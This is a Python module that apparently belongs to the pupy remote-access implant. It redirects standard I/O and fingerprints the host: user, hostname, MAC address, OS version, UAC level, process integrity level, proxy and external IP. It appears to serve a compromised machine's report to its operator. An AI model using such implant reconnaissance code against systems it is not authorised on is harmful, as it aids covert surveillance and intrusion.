# -*- coding: utf-8 -*-

import platform
import getpass
import uuid
import sys
import os
import locale
import logging
import pupy

import encodings

# Restore write/stdout/stderr

if not hasattr(os, 'real_write'):
    if type(os.write).__name__ == 'builtin_function_or_method':
        os.real_write = os.write

allowed_std = ('file', 'Blackhole', 'NoneType')

if not hasattr(sys, 'real_stdout') and type(sys.stdout).__name__ in allowed_std:
    sys.real_stdout = sys.stdout

if not hasattr(sys, 'real_stderr') and type(sys.stderr).__name__ in allowed_std:
    sys.real_stderr = sys.stderr

if not hasattr(sys, 'real_stdin') and type(sys.stdin).__name__ in allowed_std:
    sys.real_stdin = sys.stdin

if not hasattr(os, 'stdout_write'):
    def stdout_write(fd, s):
        if fd == 1:
            return sys.stdout.write(s)
        elif fd == 2:
            return sys.stderr.write(s)
        else:
            return os.real_write(fd, s)

    os.stdout_write = stdout_write

# Remove IDNA module if it was not properly loaded
if hasattr(encodings, 'idna') and not hasattr(encodings.idna, 'getregentry'):
    if 'encodings.idna' in sys.modules:
        del sys.modules['encodings.idna']

    if 'idna' in encodings._cache:
        del encodings._cache['idna']

os_encoding = locale.getpreferredencoding() or "utf8"

if sys.platform == 'win32':
    from _winreg import (
        ConnectRegistry, HKEY_LOCAL_MACHINE, OpenKey, EnumValue
    )
    import ctypes

def redirect_stdo(stdout, stderr):
    sys.stdout = stdout
    sys.stderr = stderr
    os.write = os.stdout_write

def redirect_stdio(stdin, stdout, stderr):
    sys.stdin = stdin
    redirect_stdo(stdout, stderr)

def reset_stdo():
    sys.stdout = sys.real_stdout
    sys.stderr = sys.real_stderr
    os.write = os.real_write

def reset_stdio():
    sys.stdin = sys.real_stdin
    reset_stdo()

def get_integrity_level():
    '''from http://www.programcreek.com/python/example/3211/ctypes.c_long'''

    if sys.platform != 'win32':
        if os.geteuid() != 0:
            return "Medium"
        else:
            return "High"

    mapping = {
        0x0000: u'Untrusted',
        0x1000: u'Low',
        0x2000: u'Medium',
        0x2100: u'Medium high',
        0x3000: u'High',
        0x4000: u'System',
        0x5000: u'Protected process',
    }

    BOOL = ctypes.c_long
    DWORD = ctypes.c_ulong
    HANDLE = ctypes.c_void_p

    class SID_AND_ATTRIBUTES(ctypes.Structure):
        _fields_ = [
            ('Sid', ctypes.c_void_p),
            ('Attributes', DWORD),
        ]

    class TOKEN_MANDATORY_LABEL(ctypes.Structure):
        _fields_ = [
            ('Label', SID_AND_ATTRIBUTES),
        ]

    TOKEN_READ = DWORD(0x20008)
    TokenIntegrityLevel = ctypes.c_int(25)
    ERROR_INSUFFICIENT_BUFFER = 122

    ctypes.windll.kernel32.GetLastError.argtypes = ()
    ctypes.windll.kernel32.GetLastError.restype = DWORD
    ctypes.windll.kernel32.GetCurrentProcess.argtypes = ()
    ctypes.windll.kernel32.GetCurrentProcess.restype = ctypes.c_void_p
    ctypes.windll.advapi32.OpenProcessToken.argtypes = (
            HANDLE, DWORD, ctypes.POINTER(HANDLE))
    ctypes.windll.advapi32.OpenProcessToken.restype = BOOL
    ctypes.windll.advapi32.GetTokenInformation.argtypes = (
            HANDLE, ctypes.c_long, ctypes.c_void_p, DWORD, ctypes.POINTER(DWORD))
    ctypes.windll.advapi32.GetTokenInformation.restype = BOOL
    ctypes.windll.advapi32.GetSidSubAuthorityCount.argtypes = [ctypes.c_void_p]
    ctypes.windll.advapi32.GetSidSubAuthorityCount.restype = ctypes.POINTER(
            ctypes.c_ubyte)
    ctypes.windll.advapi32.GetSidSubAuthority.argtypes = (ctypes.c_void_p, DWORD)
    ctypes.windll.advapi32.GetSidSubAuthority.restype = ctypes.POINTER(DWORD)

    token = ctypes.c_void_p()
    proc_handle = ctypes.windll.kernel32.GetCurrentProcess()
    if not ctypes.windll.advapi32.OpenProcessToken(
            proc_handle,
            TOKEN_READ,
            ctypes.byref(token)):
        logging.error('Failed to get process token')
        return None

    if token.value == 0:
        logging.error('Got a NULL token')
        return None
    try:
        info_size = DWORD()
        if ctypes.windll.advapi32.GetTokenInformation(
                token,
                TokenIntegrityLevel,
                ctypes.c_void_p(),
                info_size,
                ctypes.byref(info_size)):
            logging.error('GetTokenInformation() failed expectation')
            return None

        if info_size.value == 0:
            logging.error('GetTokenInformation() returned size 0')
            return None

        if ctypes.windll.kernel32.GetLastError() != ERROR_INSUFFICIENT_BUFFER:
            logging.error(
                    'GetTokenInformation(): Unknown error: %d',
                    ctypes.windll.kernel32.GetLastError())
            return None

        token_info = TOKEN_MANDATORY_LABEL()
        ctypes.resize(token_info, info_size.value)
        if not ctypes.windll.advapi32.GetTokenInformation(
                token,
                TokenIntegrityLevel,
                ctypes.byref(token_info),
                info_size,
                ctypes.byref(info_size)):
            logging.error(
                    'GetTokenInformation(): Unknown error with buffer size %d: %d',
                    info_size.value,
                    ctypes.windll.kernel32.GetLastError())
            return None

        p_sid_size = ctypes.windll.advapi32.GetSidSubAuthorityCount(
                token_info.Label.Sid)
        res = ctypes.windll.advapi32.GetSidSubAuthority(
                token_info.Label.Sid, p_sid_size.contents.value - 1)
        value = res.contents.value
        return mapping.get(value) or u'0x%04x' % value

    finally:
        ctypes.windll.kernel32.CloseHandle(token)

def getUACLevel():
    if sys.platform != 'win32':
        return 'N/A'
    i, consentPromptBehaviorAdmin, enableLUA, promptOnSecureDesktop = 0, None, None, None
    try:
        Registry = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
        RawKey = OpenKey(Registry, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
    except:
        return "?"
    while True:
        try:
            name, value, type = EnumValue(RawKey, i)
            if name == "ConsentPromptBehaviorAdmin":
                consentPromptBehaviorAdmin = value
            elif name == "EnableLUA":
                enableLUA = value
            elif name == "PromptOnSecureDesktop":
                promptOnSecureDesktop = value
            i+=1
        except WindowsError:
            break

    if consentPromptBehaviorAdmin == 2 and enableLUA == 1 and promptOnSecureDesktop == 1:
        return "3/3"
    elif consentPromptBehaviorAdmin == 5 and enableLUA == 1 and promptOnSecureDesktop == 1:
        return "2/3"
    elif consentPromptBehaviorAdmin == 5 and enableLUA == 1 and promptOnSecureDesktop == 0:
        return "1/3"
    elif enableLUA == 0:
        return "0/3"
    else:
        return "?"

def GetUserName():
    from ctypes import windll, WinError, create_unicode_buffer, byref, c_uint32, GetLastError

    DWORD = c_uint32
    nSize = DWORD(0)
    windll.secur32.GetUserNameExW(2, None, byref(nSize))
    error = GetLastError()
    ERROR_INSUFFICIENT_BUFFER = 122
    ERROR_MORE_DATA_AVAILABLE = 234

    if error not in (ERROR_INSUFFICIENT_BUFFER, ERROR_MORE_DATA_AVAILABLE):
        raise WinError(error)

    lpBuffer = create_unicode_buffer('', nSize.value + 1)
    nSize = DWORD(nSize.value + 1)
    success = windll.secur32.GetUserNameExW(2, lpBuffer, byref(nSize))

    if not success:
        raise WinError(GetLastError())

    return lpBuffer.value

def get_uuid():
    user = None
    hostname = None
    node = None
    plat = None
    release = None
    version = None
    machine = None
    macaddr = None
    pid = None
    proc_arch = None
    proc_path = sys.executable
    uacLevel = None
    integrity_level = None
    try:
        if sys.platform=="win32":
            user = GetUserName().encode("utf8")
        else:
            user = getpass.getuser().decode(
                encoding=os_encoding
            ).encode("utf8")
    except Exception as e:
        logging.exception(e)
        user='?'
        pass

    try:
        hostname = platform.node().decode(
            encoding=os_encoding
        ).encode("utf8")

        if sys.platform == 'win32' and user.startswith(hostname + '\\'):
            user = user.split('\\', 1)[1]

    except Exception:
        pass

    try:
        version=platform.platform()
    except Exception:
        pass

    try:
        plat = platform.system()
        if plat == 'Java':
            # Jython!
            if hasattr(sys, 'system_java'):
                plat = sys.system_java
            else:
                jsystem = sys.platform.getshadow()

                # Fix this crap
                setattr(sys, 'platform', jsystem)

                if jsystem == 'linux2':
                    plat = 'Linux+Java'
                elif jsystem == 'win32':
                    plat = 'Windows+Java'
                else:
                    plat = jsystem + '+Java'

                setattr(sys, 'system_java', plat)

                import ctypes.util
                plat += '+JyNI'

                setattr(sys, 'system_java', plat)

                del ctypes.util

    except Exception:
        pass

    try:
        release=platform.release()
    except Exception:
        pass

    try:
        version=platform.version()
    except Exception:
        pass

    try:
        machine=platform.machine()
    except Exception:
        pass

    try:
        pid=os.getpid()
    except Exception:
        pass

    try:
        osname=os.name
    except Exception:
        pass

    try:
        proc_arch=platform.architecture()[0]
    except Exception:
        pass

    try:
        node = '{:012x}'.format(uuid.getnode())
        macaddr = ':'.join(node[i:i+2] for i in range(0, 12, 2))
    except Exception:
        pass

    try:
        uacLevel = getUACLevel()
    except Exception as e:
        uacLevel = "?"

    try:
        integrity_level = get_integrity_level()
    except Exception as e:
        integrity_level = "?"

    try:
        cid = pupy.cid
    except:
        cid = None

    proxy = None
    try:
        from network.lib.proxies import LAST_PROXY
        if LAST_PROXY:
            proxy = tuple([
                x for x in LAST_PROXY if x
            ])
    except ImportError:
        proxy = None

    try:
        external_ip = None

        from network.lib.online import LAST_EXTERNAL_IP
        if LAST_EXTERNAL_IP:
            external_ip = str(LAST_EXTERNAL_IP)
    except ImportError:
        external_ip = None

    return {
        'user': user,
        'hostname': hostname,
        'node': node,
        'platform': plat,
        'release': release,
        'version': version,
        'os_arch': machine,
        'os_name': osname,
        'node': node,
        'macaddr': macaddr,
        'pid': pid,
        'proc_arch': proc_arch,
        'exec_path': proc_path,
        'uac_lvl': uacLevel,
        'intgty_lvl': integrity_level,
        'cid': cid,
        'proxy': proxy,
        'external_ip': external_ip
    }
